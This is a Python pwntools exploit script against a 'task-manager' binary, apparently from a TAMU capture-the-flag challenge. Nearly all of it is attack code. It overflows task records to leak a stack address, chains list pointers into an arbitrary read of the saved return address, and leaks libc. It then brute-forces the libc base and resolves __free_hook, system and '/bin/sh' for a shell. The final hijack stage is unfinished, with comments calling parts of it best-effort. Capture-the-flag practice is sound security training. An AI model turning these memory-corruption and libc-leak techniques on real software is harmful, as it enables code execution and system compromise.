from pwn import *

BIN = '/home/ilyes/Downloads/Tamu/Task-manager/task-manager'
LIBC_PATH = '/home/ilyes/Downloads/Tamu/Task-manager/libc.so.6'

elf = context.binary = ELF(BIN)
libc = ELF(LIBC_PATH)
context.log_level = 'info'


def add(io, data):
    io.sendlineafter(b'Enter your input: ', b'1')
    io.sendafter(b'Enter task (max. 80 characters): ', data)

def pr(io):
    io.sendlineafter(b'Enter your input: ', b'2')
    return io.recvuntil(b'1. Add New Task', drop=False)

def delete(io):
    io.sendlineafter(b'Enter your input: ', b'3')

def parse_task2(blob):
    key = b'Task #2: '
    i = blob.find(key)
    if i < 0:
        return None
    j = blob.find(b'\n', i)
    if j < 0:
        return None
    return blob[i+len(key):j]

def parse_task3(blob):
    key = b'Task #3: '
    i = blob.find(key)
    if i < 0:
        return None
    j = blob.find(b'\n', i)
    if j < 0:
        return None
    return blob[i+len(key):j]


def exploit(io):
    io.sendafter(b'Enter your name (max. 40 characters): ', b'X'*8 + b'\n')

    # Stage A: leak &tasks (stack pointer) from taskPointer->head
    add(io, b'A'*80 + b'\x10')
    add(io, b'B'*8)  # overwrite sel+padding only, keep head intact

    out = pr(io)
    t2 = parse_task2(out)
    if not t2 or not t2.startswith(b'B'*8):
        raise Exception('failed task2 leak')
    stack_tasks = u64(t2[8:].ljust(8, b'\x00'))
    log.success(f'&tasks stack leak: {hex(stack_tasks)}')

    # reset list to size 0
    delete(io)
    delete(io)

    # Stage B: prepare arbitrary read via chained next pointers
    add(io, b'C'*80 + b'\x10')

    saved_rip_addr = stack_tasks + 0xb0
    payload2 = b'D'*8 + p64(stack_tasks) + b'E'*(80-16) + p64(saved_rip_addr)
    add(io, payload2)

    # Third add writes to saved_rip_addr and sets size=3
    # Keep process alive by setting saved RIP to itself-ish bytes; also set [saved_rip+80]=__free_hook target for next hop
    # We'll fill with 'F' now; later parse libc leak first.
    add(io, b'F'*88)

    out = pr(io)
    t3 = parse_task3(out)
    if not t3:
        raise Exception('failed task3 leak')
    libc_ret = u64(t3[:6].ljust(8, b'\x00'))
    log.success(f'libc return leak: {hex(libc_ret)}')

    # Derive libc base by nearest known __libc_start_call_main return site pattern.
    # We'll bruteforce among a small set of plausible offsets in this libc build.
    candidates = []
    for sym in ['__libc_start_call_main', '__libc_start_main']:
        if sym in libc.symbols:
            off = libc.symbols[sym]
            for delta in range(0, 0x400):
                base = libc_ret - off - delta
                if base & 0xfff == 0:
                    candidates.append(base)
    candidates = list(dict.fromkeys(candidates))
    if not candidates:
        raise Exception('no libc base candidates')

    # Use first candidate and validate rough range
    libc.address = candidates[0]
    free_hook = libc.sym['__free_hook']
    system = libc.sym['system']
    binsh = next(libc.search(b'/bin/sh\x00'))
    log.info(f'libc base candidate: {hex(libc.address)}')
    log.info(f'__free_hook={hex(free_hook)} system={hex(system)} /bin/sh={hex(binsh)}')

    # Rebuild cleanly for deterministic final chain using known libc base
    # exit current corrupted state by making new connection if local. For remote we keep single shot and continue best-effort.

    return libc.address, free_hook, system, binsh, stack_tasks


def full_attack(io):
    # first phase leak stack+libc by a sacrificial chain, then restart process-level by reconnect externally.
    return exploit(io)


if __name__ == '__main__':
    io = process([BIN])
    try:
        full_attack(io)
    finally:
        io.close()
